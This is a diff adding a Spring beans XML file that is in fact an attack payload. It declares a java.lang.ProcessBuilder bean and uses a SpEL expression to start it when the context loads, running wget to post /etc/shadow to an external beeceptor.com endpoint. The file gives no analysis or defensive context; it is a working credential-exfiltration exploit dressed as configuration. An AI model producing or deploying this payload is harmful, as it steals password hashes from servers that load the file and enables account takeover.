@@ -1,0 +1,15 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="processBuilder" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <array>
+                <value>/usr/bin/wget</value>
+                <value>https://dlf-madrid.free.beeceptor.com</value>
+                <value>--post-file</value>
+                <value>/etc/shadow</value>       
+            </array>
+        </constructor-arg>
+        <property name="name" value="#{ processBuilder.start() }"/>
+    </bean>
+</beans>
